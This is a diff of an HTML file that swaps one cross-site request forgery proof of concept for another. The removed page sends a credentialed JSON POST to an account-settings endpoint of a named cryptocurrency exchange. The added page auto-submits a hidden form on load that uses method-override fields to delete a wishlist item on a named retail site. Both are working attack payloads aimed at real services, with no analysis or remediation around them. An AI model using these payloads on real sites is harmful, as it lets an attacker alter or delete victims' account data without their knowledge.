@@ -1,75 +1,21 @@
 <!doctype html>
-<html lang="en">
-<head>
-  <meta charset="utf-8" />
-  <title>CSRF PoC — JSON Content-Type (manual)</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <style>
-    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial; padding: 20px; background:#f7f7f8; }
-    .card { background: #fff; border: 1px solid #e1e4e8; border-radius: 10px; padding: 18px; max-width:720px; }
-    label { display:block; margin:8px 0 4px; font-weight:600; }
-    textarea, input[type=text] { width:100%; box-sizing:border-box; padding:8px; border-radius:6px; border:1px solid #d0d7de; }
-    button { margin-top:12px; padding:10px 14px; font-size:15px; border-radius:8px; cursor:pointer; }
-    pre { background:#111; color:#fff; padding:12px; border-radius:8px; overflow:auto; margin-top:12px; }
-    .hint { font-size:13px; color:#555; margin-top:10px; }
-  </style>
-</head>
-<body>
-  <div class="card">
-    <h2>CSRF PoC — JSON Content-Type</h2>
-
-    <p>
-      This sends a POST to <code>https://bitso.com/api/v3/settings/account</code> with
-      <code>Content-Type: application/json</code>. It also includes the <code>Authorization: Bitso-CSRF-TOKEN </code>
-      header. Click <strong>Submit</strong> while you're on the bitso.com origin (or run as bookmarklet / in console) to execute.
-    </p>
-
-    <label for="auth">Authorization header value</label>
-    <input id="auth" type="text" value="Bitso-CSRF-TOKEN " />
-
-    <label for="payload">JSON payload</label>
-    <textarea id="payload" rows="5">{"slippage_protection_enabled":true}</textarea>
-
-    <button id="send">Submit request</button>
-
-    <p class="hint">
-      Note: For this to work the page must run on the <strong>same origin</strong> as the API (https://bitso.com).
-      If you open this page from another origin, the browser will block custom headers / JSON unless the server allows it via CORS.
-    </p>
-
-    <pre id="result">Result will appear here after submit.</pre>
-  </div>
-
-  <script>
-    (function(){
-      const sendBtn = document.getElementById('send');
-      const result = document.getElementById('result');
-      sendBtn.addEventListener('click', async function(e){
-        e.preventDefault();
-        result.textContent = 'Sending...';
-
-        const auth = document.getElementById('auth').value;
-        let bodyText = document.getElementById('payload').value.trim();
-        try {
-          // Ensure JSON parse for nicer error messages
-          const parsed = JSON.parse(bodyText);
-          const resp = await fetch('https://bitso.com/api/v3/settings/account', {
-            method: 'POST',
-            credentials: 'include',   // send cookies
-            headers: {
-              'Content-Type': 'application/json',
-              'Authorization': auth
-            },
-            body: JSON.stringify(parsed)
-          });
-
-          const text = await resp.text();
-          result.textContent = 'HTTP ' + resp.status + ' ' + resp.statusText + '\n\n' + text;
-        } catch (err) {
-          result.textContent = 'Error: ' + err.message;
-        }
-      });
-    })();
-  </script>
-</body>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>CSRF PoC — method override</title>
+  </head>
+  <body onload="document.forms[0].submit()">
+    <form action="https://www.adidas.co.in/gw/wsh/wishlists/9ca84ea3-c265-4752-9697-f8558a1dcf0b/products/KD8363" method="post">
+      <!-- common names used by frameworks -->
+      <input type="hidden" name="_method" value="DELETE">
+      <!-- alternate header-style override (server may accept as param) -->
+      <input type="hidden" name="X-HTTP-Method-Override" value="DELETE">
+      <!-- include "body" placeholder; server-specific -->
+      <input type="hidden" name="payload" value="{}">
+      <noscript>
+        <p>Javascript disabled — click the button to submit the PoC.</p>
+        <button type="submit">Submit</button>
+      </noscript>
+    </form>
+  </body>
 </html>
